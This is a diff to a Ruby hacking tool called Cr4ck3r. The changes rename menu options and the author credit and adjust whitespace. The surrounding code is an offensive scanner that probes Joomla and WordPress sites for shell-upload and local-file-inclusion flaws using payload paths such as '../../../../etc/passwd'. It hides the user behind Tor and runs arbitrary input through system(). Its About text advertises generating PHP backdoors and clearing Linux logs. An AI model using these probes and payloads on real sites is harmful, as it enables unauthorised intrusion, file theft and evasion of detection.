@@ -31,7 +31,7 @@ C:::::C               r:::::r                      4::::4  c:::::c              
         CCCCCCCCCCCCC rrrrrrr                    4444444444    cccccccccccccccckkkkkkkk    kkkkkkk333333333333333    rrrrrrr            
                                                                  ".red                                                                             
 puts  "
-                     **Powered By D3crypT0r (🅢🅨🅔🅓 🅡🅘🅩🅦🅐🅝 🅗🅘🅛🅐🅛 🅢🅗🅐🅗)**
+                     **Powered By D3crypT0r (Syed Rizwan Hilal Shah)**
 <Track my Target>  |  Gather information                                
                         About Targets
 ".green
@@ -46,16 +46,16 @@ if $option == "help"  then
 
 puts
 
-puts "[site] MAKE YOUR TARGET".green
-puts "[help] show this MESSAGE".green
-puts "[targ] Search targets".green
+puts "[Input] MAKE YOUR TARGET".green
+puts "[Help] show this MESSAGE".green
+puts "[Target] Search targets".green
 puts "[exit] exit the script".green
-puts "[uptd] Update Cr4ck3r".green
-puts "[anon] Run Anonymous Mode".green
-puts "[info] About Cr4ck3r".green
+puts "[Update] Update Cr4ck3r".green
+puts "[Anonymous] Run Anonymous Mode".green
+puts "[About] About Cr4ck3r".green
 puts                  
 end
-if $option == "anon" then 
+if $option == "Anonymous" then 
 puts
 puts "ANONSURF START **** ".green.on_blue
 system("service tor start ")
@@ -65,7 +65,7 @@ end
 if $option == "99" then
 system("anonsurf stop service")
 end
-if $option == "targ" then 
+if $option == "Target" then 
 puts "[1] Search Target Shodan".blue 
 puts "[2] Shodan Port Scanner".blue
 end
@@ -117,17 +117,17 @@ puts "[+] Success ! Target saved in result.txt".green
 system("pause>nul")
 end
 end
-if $option == "info" then
+if $option == "About" then
     puts "
 You Can use this tool to Spider your website and get important information and gather information automaticaly using whatweb-host-traceroute-dig-fierce-wafw00f or to Identify the cms and to find the vulnerability in your website using Cms Exploit Scanner && WebApp Vul Scanner Also You can use killshot to Scan automaticly multiple type of scan with nmap and unicorn . And With this tool You can Generate PHP Simple Backdoors upload it manual and connect to the target using killshot
 This Tool Bearing A simple Ruby Fuzzer Tested on VULSERV.exe And Linux Log clear script To change the content of login paths Spider can help you to find parametre of the site and scan xss and 
 add shodan tools in the last update 
 ".blue
 end
-if $option == "uptd" then 
+if $option == "Update" then 
 system("git clone https://github.com/D3crypT0r/Cr4ck3r.git")
 end
-if $option == "site" then
+if $option == "Input" then
     
 	print "Site : ".green
   $url = gets.chomp
@@ -318,7 +318,7 @@ end
                 elsif ($joom.code > "300") and (a == 4) then
                     puts "[-] Com_fabrik Upload Shell".red
                 elsif ($joom.code == "200") and (a == 5) then
-                                      puts "[+] Com foxcontact Arbitrary File Upload".green
+				      puts "[+] Com foxcontact Arbitrary File Upload".green
 		    puts " --> https://cxsecurity.com/issue/WLB-2016050072 #".blue
                 elsif ($joom.code > "300") and (a == 5) then
                     puts "[-] Com foxcontact Arbitrary File Upload".red
@@ -358,7 +358,7 @@ end
                 a = a + 1
                            end
 end
- if ($sourcex =~ /generator" content="WordPress/) then
+  if ($sourcex =~ /generator" content="WordPress/) then
          e = 1
          wordpress = ["/readme.html","/wordpress/wp-content/plugins/localize-my-post/ajax/include.php?file=../../../../../../../../../../etc/passwd","/wp-content/plugins/wp-events-calendar/public/ajax/getEventsList.php?year=2018&month=5&day=1&calendar_id=1&pag=1","/wp-content/plugins/peugeot-music-plugin/js/plupload/examples/upload.php","/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd","wp-content/themes/WPStore/upload/index.php","wp-content/plugins/sexy-contact-form/includes/fileupload/index.php","wp-content/plugins/lazy-seo/lazyseo.php","wp-content/plugins/easy-comment-uploads/upload-form.php","wp-symposium/server/file_upload_form.php","wp-content/uploads/wp-security-audit-log/","/wp-admin/admin.php?page=powerzoomer_manage","/?gf_page=upload"]
         wordpress.each do |link|
@@ -412,7 +412,7 @@ puts "[-] WordPress Plugin Localize My Post 1.0 - Local File Inclusion Not Found
                 elsif ($xxxxxxxx.code == "200") and  (e == 8 )
                 puts "[+] Wordpress Lazy SEO plugin Shell Upload Vulnerability  ! ".green
                   puts "  --- > https://cxsecurity.com/issue/WLB-2017080132".blue
-                elsif ($xxxxxxxx.code > "300") and (e == 8 )
+		elsif ($xxxxxxxx.code > "300") and (e == 8 )
 
                                  puts "[-] Wordpress Lazy SEO plugin Shell Upload Vulnerability ".red
 
@@ -566,7 +566,7 @@ while true do
                                       
                                     end
                                 end
-                   if $web == "8" then 
+			    if $web == "8" then 
                     system("clear")
                     system("cls")
                     print "
@@ -656,7 +656,7 @@ linuxlog = [
                     puts "[ banner] Show main page".blue
                     puts "[ exit  ]   Exit  ".blue
                     puts "[ help  ] Show this message".blue
-                    end
+		    end
                 
                     if $web == "4" then
 
@@ -696,7 +696,7 @@ linuxlog = [
                    if $web == "3" then
                     system("clear")
                     system("cls")
-                            puts " 
+			    puts " 
                             
      ___      __    __  .___________.  ______   .___  ___.      ___   .___________. __    ______   .__   __. 
     /   \    |  |  |  | |           | /  __  \  |   \/   |     /   \  |           ||  |  /  __  \  |  \ |  | 
@@ -759,7 +759,7 @@ linuxlog = [
                             ipp = gets.chomp
                             system("unicornscan –mU –v –I #{ipp}/24")
                         elsif scanner == "exit"
-                            break
+			    break
                         else
                             system("#{scanner}")
                         end
